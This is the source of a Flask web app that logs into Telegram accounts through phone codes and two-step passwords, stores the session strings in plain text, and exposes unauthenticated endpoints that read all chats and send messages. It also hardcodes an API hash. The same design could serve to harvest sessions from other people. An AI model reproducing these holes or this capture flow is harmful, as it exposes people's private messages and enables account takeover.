from flask import Flask, send_file, jsonify, request, render_template
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument, 
    DocumentAttributeAudio, DocumentAttributeVideo,
    MessageMediaWebPage, MessageMediaContact, MessageMediaGeo
)
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
import json
import os
import asyncio
import logging
import time
from datetime import datetime
import traceback

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='.')
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
temp_sessions = {}  # Temporary storage for OTP sessions

# Helper function to run async code
def run_async(coro):
    """Run async coroutine in a new event loop"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    finally:
        try:
            loop.close()
        except:
            pass

# Load accounts from file
def load_accounts():
    """Load accounts from JSON file"""
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
                return []
        return []
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        return []

# Save accounts to file
def save_accounts(accounts):
    """Save accounts to JSON file"""
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2, default=str)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Initialize accounts
accounts = load_accounts()
logger.info(f"Loaded {len(accounts)} accounts from {ACCOUNTS_FILE}")

# -------------------- PAGES --------------------
@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/home')
def home_page():
    return render_template('login.html')

# -------------------- API ENDPOINTS --------------------

# Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Return all saved accounts"""
    global accounts
    accounts = load_accounts()  # Reload to ensure latest data
    
    # Format accounts for frontend
    formatted_accounts = []
    for acc in accounts:
        formatted_accounts.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'username': acc.get('username', '')
        })
    
    return jsonify({
        'success': True, 
        'accounts': formatted_accounts
    })

# Send OTP code
@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Start phone verification process"""
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Clean phone number
    phone = phone.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    
    logger.info(f"Sending code to {phone}")
    
    async def send_code():
        """Send verification code"""
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Send code request
            result = await client.send_code_request(phone)
            
            # Save session for later
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'session': client.session.save()
            }
            
            logger.info(f"Code sent to {phone}, session_id: {session_id}")
            
            return {
                'success': True,
                'session_id': session_id
            }
            
        except errors.FloodWaitError as e:
            logger.error(f"Flood wait: {e}")
            return {'success': False, 'error': f'Too many attempts. Try again in {e.seconds} seconds'}
        except Exception as e:
            logger.error(f"Error sending code: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in add-account: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Verify code and complete login
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify OTP code and complete login"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Code and session ID required'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
    
    session_data = temp_sessions[session_id]
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    session_string = session_data['session']
    
    logger.info(f"Verifying code for {phone}")
    
    async def verify():
        """Verify code and sign in"""
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Try to sign in
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            except errors.SessionPasswordNeededError:
                # 2FA required
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Request new code.'}
            
            # Get user info
            me = await client.get_me()
            
            # Create account entry
            new_account = {
                'id': int(time.time()),  # Use timestamp as ID
                'phone': me.phone or phone,
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': client.session.save(),
                'added_at': time.time()
            }
            
            # Save to global accounts
            global accounts
            accounts = load_accounts()
            accounts.append(new_account)
            save_accounts(accounts)
            
            logger.info(f"Added account: {new_account['name']} ({new_account['phone']})")
            
            return {
                'success': True,
                'account': {
                    'id': new_account['id'],
                    'name': new_account['name'],
                    'phone': new_account['phone']
                }
            }
            
        except Exception as e:
            logger.error(f"Error in verify: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        # Clean up temp session if successful or not needing password
        if result.get('success') or not result.get('need_password'):
            if session_id in temp_sessions:
                del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in verify-code: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Get chats and messages
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get all chats and recent messages for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    accounts = load_accounts()
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session')
    if not session_string:
        return jsonify({'success': False, 'error': 'No session found'})
    
    logger.info(f"Fetching chats for account {account_id}")
    
    async def fetch_chats():
        """Fetch all dialogs and messages"""
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            # Get all dialogs
            dialogs = await client.get_dialogs()
            
            chats = []
            all_messages = []
            
            for dialog in dialogs:
                if not dialog or not dialog.entity:
                    continue
                
                # Determine chat type
                if dialog.is_user:
                    if hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                        chat_type = 'bot'
                    else:
                        chat_type = 'user'
                elif dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                else:
                    chat_type = 'user'
                
                # Get chat name
                name = dialog.name or 'Unknown'
                if dialog.is_user and hasattr(dialog.entity, 'first_name'):
                    name = f"{dialog.entity.first_name or ''} {dialog.entity.last_name or ''}".strip()
                
                # Get chat ID as string
                chat_id = str(dialog.id)
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    chat_id = f"@{dialog.entity.username}"
                
                # Last message info
                last_msg = ''
                last_msg_media = None
                last_date = 0
                
                if dialog.message:
                    if dialog.message.text:
                        last_msg = dialog.message.text[:100]
                    elif dialog.message.media:
                        if isinstance(dialog.message.media, MessageMediaPhoto):
                            last_msg = '📷 Photo'
                            last_msg_media = 'photo'
                        elif isinstance(dialog.message.media, MessageMediaDocument):
                            # Check if it's a video or document
                            attrs = dialog.message.media.document.attributes
                            is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
                            is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
                            
                            if is_video:
                                last_msg = '🎥 Video'
                                last_msg_media = 'video'
                            elif is_audio:
                                for attr in attrs:
                                    if isinstance(attr, DocumentAttributeAudio):
                                        if attr.voice:
                                            last_msg = '🎤 Voice'
                                            last_msg_media = 'voice'
                                        else:
                                            last_msg = '🎵 Audio'
                                            last_msg_media = 'audio'
                                        break
                            else:
                                last_msg = '📎 Document'
                                last_msg_media = 'document'
                        elif isinstance(dialog.message.media, MessageMediaWebPage):
                            last_msg = '🔗 Link'
                            last_msg_media = 'link'
                        else:
                            last_msg = '📎 Media'
                            last_msg_media = 'media'
                    
                    if dialog.message.date:
                        last_date = int(dialog.message.date.timestamp())
                
                # Add to chats list
                chats.append({
                    'id': chat_id,
                    'title': name,
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': last_msg,
                    'lastMessageMedia': last_msg_media,
                    'lastMessageDate': last_date,
                    'pinned': dialog.pinned or False
                })
                
                # Get recent messages for this chat (limit 20)
                try:
                    messages = await client.get_messages(dialog.entity, limit=20)
                    
                    for msg in messages:
                        if not msg:
                            continue
                        
                        # Message text
                        msg_text = msg.text or ''
                        media_type = None
                        
                        # Check for media
                        if msg.media:
                            if isinstance(msg.media, MessageMediaPhoto):
                                media_type = 'photo'
                                if not msg_text:
                                    msg_text = '📷 Photo'
                            elif isinstance(msg.media, MessageMediaDocument):
                                attrs = msg.media.document.attributes
                                is_video = any(isinstance(attr, DocumentAttributeVideo) for attr in attrs)
                                is_audio = any(isinstance(attr, DocumentAttributeAudio) for attr in attrs)
                                
                                if is_video:
                                    media_type = 'video'
                                    if not msg_text:
                                        msg_text = '🎥 Video'
                                elif is_audio:
                                    for attr in attrs:
                                        if isinstance(attr, DocumentAttributeAudio):
                                            if attr.voice:
                                                media_type = 'voice'
                                                if not msg_text:
                                                    msg_text = '🎤 Voice message'
                                            else:
                                                media_type = 'audio'
                                                if not msg_text:
                                                    msg_text = '🎵 Audio'
                                            break
                                else:
                                    media_type = 'document'
                                    if not msg_text:
                                        msg_text = '📎 Document'
                            elif isinstance(msg.media, MessageMediaWebPage):
                                media_type = 'link'
                                if not msg_text:
                                    msg_text = '🔗 Link'
                            else:
                                media_type = 'media'
                                if not msg_text:
                                    msg_text = '📎 Media'
                        
                        # Message date
                        msg_date = 0
                        if msg.date:
                            msg_date = int(msg.date.timestamp())
                        
                        all_messages.append({
                            'chatId': chat_id,
                            'text': msg_text,
                            'date': msg_date,
                            'out': msg.out or False,
                            'id': msg.id,
                            'hasMedia': msg.media is not None,
                            'mediaType': media_type
                        })
                        
                except Exception as e:
                    logger.error(f"Error getting messages for {chat_id}: {e}")
                    continue
            
            logger.info(f"Fetched {len(chats)} chats and {len(all_messages)} messages")
            
            return {
                'success': True,
                'chats': chats,
                'messages': all_messages
            }
            
        except Exception as e:
            logger.error(f"Error in fetch_chats: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch_chats())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in get-messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    """Send a message to a chat"""
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    if not message:
        return jsonify({'success': False, 'error': 'Message cannot be empty'})
    
    # Find account
    accounts = load_accounts()
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session')
    if not session_string:
        return jsonify({'success': False, 'error': 'No session found'})
    
    logger.info(f"Sending message from account {account_id} to {chat_id}")
    
    async def send():
        """Send the message"""
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            # Get the chat entity
            try:
                # Try to get as integer ID first
                if chat_id.startswith('-100'):
                    entity = await client.get_entity(int(chat_id))
                elif chat_id.startswith('@'):
                    entity = await client.get_entity(chat_id)
                else:
                    try:
                        entity = await client.get_entity(int(chat_id))
                    except ValueError:
                        entity = await client.get_entity(chat_id)
            except Exception as e:
                logger.error(f"Error getting entity: {e}")
                return {'success': False, 'error': f'Chat not found: {str(e)}'}
            
            # Send message
            await client.send_message(entity, message)
            
            logger.info(f"Message sent successfully to {chat_id}")
            return {'success': True}
            
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in send-message: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    accounts = load_accounts()
    original_count = len(accounts)
    
    # Filter out the account to remove
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_count:
        if save_accounts(accounts):
            logger.info(f"Removed account {account_id}")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to save after removal'})
    else:
        return jsonify({'success': False, 'error': 'Account not found'})

# Health check
@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    accounts = load_accounts()
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_sessions),
        'api_id_configured': API_ID is not None,
        'api_hash_configured': API_HASH is not None,
        'accounts_file': os.path.exists(ACCOUNTS_FILE)
    })

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('login.html')

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {error}")
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*60)
    print('📱 TELEGRAM MANAGER - FIXED VERSION')
    print('='*60)
    print(f'✅ Loaded {len(accounts)} accounts from {ACCOUNTS_FILE}')
    print(f'✅ API_ID: {API_ID}')
    print(f'✅ API_HASH: {"*" * min(10, len(API_HASH)) if API_HASH else "Not set"}')
    print('✅ Endpoints:')
    print('   - GET  /, /login, /dashboard, /home')
    print('   - GET  /api/accounts')
    print('   - POST /api/add-account')
    print('   - POST /api/verify-code')
    print('   - POST /api/get-messages')
    print('   - POST /api/send-message')
    print('   - POST /api/remove-account')
    print('   - GET  /api/health')
    print('='*60 + '\n')
    
    # Create accounts file if it doesn't exist
    if not os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump([], f)
        print(f'✅ Created {ACCOUNTS_FILE}')
    
    app.run(host='0.0.0.0', port=port, debug=False)
